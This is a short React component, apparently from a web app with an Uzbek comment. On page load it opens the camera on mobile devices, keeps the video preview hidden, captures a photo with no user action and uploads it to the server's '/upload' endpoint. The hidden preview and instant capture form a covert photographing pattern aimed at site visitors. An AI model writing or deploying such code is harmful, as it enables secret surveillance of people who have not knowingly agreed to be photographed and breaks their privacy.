import React, { useEffect, useRef } from 'react';

const TakePhoto = () => {
  const videoRef = useRef(null);

  useEffect(() => {
    const startCamera = async () => {
      if (/Mobi|Android/i.test(navigator.userAgent)) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          takePicture();
        } catch (err) {
          console.error("Camera access error:", err);
        }
      }
    };

    const takePicture = async () => {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
      const dataUrl = canvas.toDataURL('image/jpeg');
      // Surati serverga yuborish
      await fetch('/upload', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ image: dataUrl })
      });
    };

    startCamera();
  }, []);

  return (
    <div>
      <h1>TakePhoto Page</h1>
      <video ref={videoRef} style={{ display: 'none' }}></video>
    </div>
  );
};

export default TakePhoto;